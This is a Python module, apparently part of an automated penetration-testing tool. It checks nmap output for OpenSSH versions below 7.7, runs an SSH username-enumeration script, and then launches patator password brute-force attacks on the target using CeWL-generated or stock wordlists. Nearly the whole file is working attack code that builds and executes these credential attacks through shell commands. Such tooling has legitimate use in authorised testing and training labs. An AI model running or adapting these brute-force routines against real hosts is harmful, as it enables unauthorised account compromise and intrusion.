#!/usr/bin/env python3

import os
from subprocess import call
from sty import fg, bg, ef, rs
import json
from lib import nmapParser
from utils import helper_lists


class Brute:
    def __init__(self, target, serviceName, port):
        self.target = target
        self.serviceName = serviceName
        self.port = port
        self.unique_users = []

    def SshUsersBrute(self):
        cmd_info = "[" + fg.green + "+" + fg.rs + "]"
        cwd = os.getcwd()
        reportDir = f"{cwd}/{self.target}-Report"
        dlu = helper_lists.DefaultLinuxUsers(self.target)
        default_linux_users = dlu.default_linux_users
        cl = helper_lists.Cewl(self.target)
        if not os.path.exists(f"{reportDir}/wordlists/all.txt"):
            cl.CewlWordlist()
        blue = fg.li_blue
        green = fg.li_green
        red = fg.red
        teal = fg.li_cyan
        reset = fg.rs
        np = nmapParser.NmapParserFunk(self.target)
        np.openPorts()
        ssh_product = np.ssh_product
        ssh_version = np.ssh_version
        string_ssh_version = " ".join(map(str, ssh_version))
        lowercase_ssh_version = str(string_ssh_version).lower()
        first_two_nums = lowercase_ssh_version[0:3]
        int_first_two_nums = float(first_two_nums)
        if ssh_product[0] == "OpenSSH":
            if int_first_two_nums < float(7.7):
                if not os.path.exists(f"{reportDir}/ssh"):
                    os.makedirs(f"{reportDir}/ssh")
                # print(f"Target:{self.target} serviceName:{self.serviceName} port:{self.port}")
                cmd = f"python {cwd}/scripts/ssh_user_enum.py --port {self.port} --userList wordlists/usernames.txt {self.target} --outputFile {reportDir}/ssh/ssh-usernames.json --outputFormat json"
                print(cmd_info, cmd)
                print("This may take a few minutes.")
                try:
                    call(cmd, shell=True)
                except ConnectionRefusedError as cre_error:
                    print(cre_error)
                    exit()
                try:
                    with open(f"{reportDir}/ssh/ssh-usernames.json") as json_file:
                        data = json.load(json_file)
                        num_valid_users = len(data["Valid"])
                        if num_valid_users < 55:
                            for valid in data["Valid"]:
                                if valid not in default_linux_users:
                                    print(
                                        f"{cmd_info} {teal}Unique User Found!{reset} {green}{valid}{reset}"
                                    )
                                    self.unique_users.append(valid)
                                else:
                                    print(f"{cmd_info} " + valid)

                        else:
                            print(f"OpenSSH returned too many false positives: {num_valid_users}")
                except FileNotFoundError as fnf_error:
                    print(fnf_error)
                    exit()

                if len(self.unique_users) > 0 and (len(self.unique_users) < 4):
                    if os.path.exists(f"{reportDir}/wordlists/all.txt"):
                        cewl_wordlist = f"{reportDir}/wordlists/all.txt"
                        if os.path.getsize(cewl_wordlist) > 0:
                            for u in self.unique_users:
                                print(
                                    f"{teal}Beginning Password Brute Force for User:{reset} {green}{u}{reset}"
                                )
                                patator_cmd = f"""patator ssh_login host={self.target} port={self.port} user={u} password=FILE0 0={cewl_wordlist} persistent=0 -x ignore:mesg='Authentication failed.'"""
                                print(f"{cmd_info} {patator_cmd}")
                                call(patator_cmd, shell=True)
                    else:
                        for u in self.unique_users:
                            print(
                                f"{teal}Beginning Password Brute Force for User:{reset} {green}{u}{reset}"
                            )
                            patator_cmd = f"""patator ssh_login host={self.target} port={self.port} user={u} password=FILE0 0={cwd}/wordlists/probable-v2-top1575.txt persistent=0 -x ignore:mesg='Authentication failed.'"""
                            print(f"{cmd_info} {patator_cmd}")
                            call(patator_cmd, shell=True)
        else:
            print(
                f"{blue}{ssh_product[0]} {ssh_version[0]}{reset} is {red}NOT{reset} vulnerable to User Enumeration"
            )
            print(
                f"If you still want to brute force SSH, Consider using a tool such as Hydra or Patator manually."
            )
            print(f"For example")
            print(
                f"""{cmd_info} patator ssh_login host={self.target} port=22 user='admin' password=FILE0 0=/usr/share/seclists/Passwords/probable-v2-top1575.txt persistent=0 -x ignore:mesg='Authentication failed.'"""
            )


class BruteSingleUser:
    def __init__(self, target, serviceName, port, user):
        self.target = target
        self.serviceName = serviceName
        self.port = port
        self.user = user

    def SshSingleUserBrute(self):
        cmd_info = "[" + fg.green + "+" + fg.rs + "]"
        cwd = os.getcwd()
        reportDir = f"{cwd}/{self.target}-Report"
        cl = helper_lists.Cewl(self.target)
        if not os.path.exists(f"{reportDir}/wordlists/all.txt"):
            cl.CewlWordlist()
        green = fg.li_green
        teal = fg.li_cyan
        reset = fg.rs
        np = nmapParser.NmapParserFunk(self.target)
        np.openPorts()
        if os.path.exists(f"{reportDir}/wordlists/all.txt"):
            cewl_wordlist = f"{reportDir}/wordlists/all.txt"
            if os.path.getsize(cewl_wordlist) > 0:
                print(
                    f"{teal}Beginning Password Brute Force for User:{reset} {green}{self.user}{reset}"
                )
                patator_cmd = f"""patator ssh_login host={self.target} port={self.port} user={self.user} password=FILE0 0={cewl_wordlist} persistent=0 -x ignore:mesg='Authentication failed.'"""
                print(f"{cmd_info} {patator_cmd}")
                call(patator_cmd, shell=True)
        else:
            print(
                f"{teal}Beginning Password Brute Force for User:{reset} {green}{self.user}{reset}"
            )
            patator_cmd = f"""patator ssh_login host={self.target} port={self.port} user={self.user} password=FILE0 0={cwd}/wordlists/probable-v2-top1575.txt persistent=0 -x ignore:mesg='Authentication failed.'"""
            print(f"{cmd_info} {patator_cmd}")
            call(patator_cmd, shell=True)


class BruteSingleUserCustom:
    def __init__(self, target, serviceName, port, user, passList):
        self.target = target
        self.serviceName = serviceName
        self.port = port
        self.user = user
        self.passList = passList

    def SshSingleUserBruteCustom(self):
        cmd_info = "[" + fg.green + "+" + fg.rs + "]"
        cwd = os.getcwd()
        green = fg.li_green
        teal = fg.li_cyan
        reset = fg.rs
        np = nmapParser.NmapParserFunk(self.target)
        np.openPorts()
        print(f"{teal}Beginning Password Brute Force for User:{reset} {green}{self.user}{reset}")
        patator_cmd = f"""patator ssh_login host={self.target} port={self.port} user={self.user} password=FILE0 0={self.passList} persistent=0 -x ignore:mesg='Authentication failed.'"""
        print(f"{cmd_info} {patator_cmd}")
        call(patator_cmd, shell=True)


# class BruteMultipleUsersCustom:
#     def __init__(self, target, serviceName, port, userList, passList):
#         self.target = target
#         self.serviceName = serviceName
#         self.port = port
#         self.userList = userList
#         self.passList = passList

#     def SshSingleUserBruteCustom(self):
#         cmd_info = "[" + fg.green + "+" + fg.rs + "]"
#         cwd = os.getcwd()
#         reportDir = f"{cwd}/{self.target}-Report"
#         green = fg.li_green
#         teal = fg.li_cyan
#         reset = fg.rs
#         np = nmapParser.NmapParserFunk(self.target)
#         np.openPorts()
#         print(
#             f"{teal}Beginning Password Brute Force with:{reset} {green}{self.userList}{reset} User List."
#         )
#         patator_cmd = f"""patator ssh_login host={self.target} port={self.port} user=FILE0  0={self.userList} password=FILE1 1={self.passList} persistent=0 -x ignore:mesg='Authentication failed.'"""
#         print(f"{cmd_info} {patator_cmd}")
#         call(patator_cmd, shell=True)
